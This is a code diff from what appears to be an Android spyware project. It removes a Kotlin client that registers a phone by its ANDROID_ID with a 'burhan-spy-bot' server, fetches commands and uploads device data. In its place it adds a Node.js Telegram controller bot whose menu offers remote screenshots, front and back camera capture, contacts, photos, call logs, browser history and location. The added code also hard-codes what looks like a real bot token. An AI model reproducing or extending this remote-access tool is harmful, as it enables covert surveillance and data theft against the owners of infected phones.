@@ -1,78 +1,34 @@
-package com.burhan.darknet.utils
+const TelegramBot = require('node-telegram-bot-api');
+const axios = require('axios');
+const express = require('express');
 
-import android.content.Context
-import android.provider.Settings
-import okhttp3.*
-import okhttp3.MediaType.Companion.toMediaType
-import okhttp3.RequestBody.Companion.toRequestBody
-import org.json.JSONObject
-import kotlinx.coroutines.Dispatchers
-import kotlinx.coroutines.withContext
+const token = '8811118034:AAHr5UjOeT43-D4zPadC80V6dmQpgsyqIcM';
+const YOUR_USER_ID = 2062068620;
+const bot = new TelegramBot(token, { polling: true });
+const app = express();
+app.use(express.json());
 
-class BotIntegration(private val context: Context) {
-    private val client = OkHttpClient()
-    private val serverUrl = "https://burhan-spy-bot.up.railway.app" // YAHAN APNA URL DAALO
+// Hamesha online rakhne ke liye Health Check endpoint
+app.get('/', (req, res) => {
+    res.status(200).json({ status: 'ok' });
+});
 
-    // PERMANENT DEVICE ID (ANDROID_ID - change nahi hoti)
-    private val deviceId: String = Settings.Secure.getString(
-        context.contentResolver,
-        Settings.Secure.ANDROID_ID
-    ) ?: "Unknown"
-
-    // Device register karo (online status)
-    suspend fun registerDevice(deviceName: String = "Android Device"): String = withContext(Dispatchers.IO) {
-        try {
-            val json = JSONObject()
-            json.put("deviceId", deviceId)
-            json.put("deviceName", deviceName)
-            json.put("status", "online")
-
-            val body = json.toString().toRequestBody("application/json".toMediaType())
-            val request = Request.Builder()
-                .url("$serverUrl/api/register-device")
-                .post(body)
-                .build()
-            client.newCall(request).execute().use { response ->
-                response.body?.string() ?: "No response"
-            }
-        } catch (e: Exception) {
-            "Error: ${e.message}"
-        }
+// Bot ko commands sunna hai
+bot.onText(/\/start/, (msg) => {
+    const chatId = msg.chat.id;
+    if (!isAuthorized(msg)) {
+        bot.sendMessage(chatId, "⛔ Access Denied!");
+        return;
     }
+    bot.sendMessage(chatId, `🔥 Welcome to Burhan Spy Bot! 🔥\n\n🎯 Owner: Sheikh Burhan\n\n📜 Commands:\n/snapshot - Screen Shot\n/front_cam - Front Camera\n/back_cam - Back Camera\n/contacts - Contacts\n/photos - Photos and Videos\n/call_logs - Call Logs\n/browser_history - Browser History\n/battery - Battery %\n/location - Location\n/ip - Original IP\n/status - Online/Offline Status\n/key_time - Key Time Status`);
+});
 
-    // App ko commands milti hain
-    suspend fun getCommands(): String = withContext(Dispatchers.IO) {
-        try {
-            val request = Request.Builder()
-                .url("$serverUrl/api/commands")
-                .build()
-            client.newCall(request).execute().use { response ->
-                response.body?.string() ?: "No commands"
-            }
-        } catch (e: Exception) {
-            "Error: ${e.message}"
-        }
-    }
-
-    // App data bhejo (photo, snapshot, status)
-    suspend fun sendDeviceData(type: String, data: String): String = withContext(Dispatchers.IO) {
-        try {
-            val json = JSONObject()
-            json.put("type", type)
-            json.put("data", data)
-            json.put("chatId", 2062068620) // YAHAN TERI USER ID DAALO
-            json.put("deviceId", deviceId) // Device ID bhejna
-
-            val body = json.toString().toRequestBody("application/json".toMediaType())
-            val request = Request.Builder()
-                .url("$serverUrl/api/device-data")
-                .post(body)
-                .build()
-            client.newCall(request).execute().use { response ->
-                response.body?.string() ?: "No response"
-            }
-        } catch (e: Exception) {
-            "Error: ${e.message}"
-        }
-    }
+// Authorization check
+function isAuthorized(msg) {
+    return msg.from.id === YOUR_USER_ID;
 }
+
+// Express server start karo
+app.listen(3000, () => {
+    console.log("Server running on port 3000");
+});
